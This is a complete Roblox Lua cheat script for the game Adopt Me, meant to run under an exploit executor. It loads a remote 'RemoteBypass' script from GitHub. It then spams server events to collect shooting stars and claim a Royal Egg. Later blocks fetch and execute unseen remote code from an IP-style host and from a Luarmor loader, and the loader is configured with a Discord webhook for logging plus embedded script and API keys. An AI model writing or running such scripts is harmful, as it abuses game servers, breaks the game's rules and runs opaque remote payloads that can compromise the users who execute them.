wait(15)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
wait(1)
local locations = {"MainMap", "MoonInterior"}
local args = {}

-- Function to collect stars
local function collectStars(location, isSpecial)
    for i = 1, 100 do
        args[1] = location
        args[2] = tostring(i)
        
        -- If it's a special star, add the third argument
        if isSpecial then
            args[3] = true
        else
            args[3] = nil
        end
        
        game:GetService("ReplicatedStorage").API:FindFirstChild("MoonAPI/ShootingStarCollected"):FireServer(unpack(args))
        wait(0.2)  -- Delay of 0.2 seconds
    end
end

-- Collect stars for both locations
for _, location in ipairs(locations) do
    collectStars(location, false)  -- Regular stars
    wait(1)  -- Wait 1 second before moving to the next location
    collectStars(location, true)   -- Special stars
    wait(1)  -- Wait 1 second before moving to the next location
end

wait(1)
local args = {
    [1] = "MoonInterior"
}

game:GetService("ReplicatedStorage").API:FindFirstChild("MoonAPI/ClaimRoyalEgg"):FireServer(unpack(args))
wait(1)
task.spawn(function()
    task.wait(35)
    getgenv().API_KEY = "RukIIrukYPFoGnQUcD7c"
    loadstring(game:HttpGet("http://ii.sebas.sbs:4241/adoptme/dashboard.lua"))()
end)

task.spawn(function()
   -- ARCEUS, CODEX ETC
script_key="NxzplPKcRYahKMvLcZtfTAOQURrRclwP";
getgenv().Config = {
    ["Winter_EVENT"] = false,
    ["PetFarmActive"] = true,
    ["EggFarmActive"] = false,
    ["Blur_username"] = true,
    ["Blazing_Lion_Log"] = false,
    ["DiscordId"] = "942321951010086922",
    ["Webhook"] = "https://discord.com/api/webhooks/123456",
}
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/66567bfd337b57eb059b58dbe1badb89.lua"))()
end)


